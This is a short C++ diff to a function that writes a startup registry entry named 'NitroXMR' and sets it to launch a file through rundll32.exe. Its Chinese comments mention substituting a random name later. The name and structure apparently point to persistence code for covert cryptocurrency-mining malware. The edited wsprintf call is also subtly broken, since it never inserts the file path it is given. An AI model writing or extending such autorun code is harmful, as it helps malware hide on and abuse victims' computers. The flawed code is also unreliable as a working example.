@@ -39,7 +39,7 @@ BOOL CToolKit::IsKeyEdit()
 
 
 
-BOOL CToolKit::setAutoRun()
+BOOL CToolKit::setAutoRun(PCWSTR szFileFullPath)
 {
 	CString exePath;
 	CRegKey reg;        //定义注册表对象
@@ -59,15 +59,18 @@ BOOL CToolKit::setAutoRun()
 		printf("[+] Open Reg OK \n");
 
 		HKEY hKey = reg.m_hKey;
-
 		if (ERROR_SUCCESS == reg.Create(hKey, L"Test", REG_NONE))
 		{
 			printf("%d\n", reg.m_hKey);
 
 			//应该传入随机名称这里先代替掉
-			GetModuleFileName(NULL, executePath, MAX_PATH);
+			//GetModuleFileName(NULL, executePath, MAX_PATH);
+			
+			TCHAR keyValue[64];
 
-			reg.SetStringValue(L"NitroXMR", executePath);
+			wsprintf(keyValue, L"rundll32.exe", szFileFullPath);
+
+			reg.SetStringValue(L"NitroXMR", keyValue);
 
 			printf("[+] Write Reg OK\n");
 
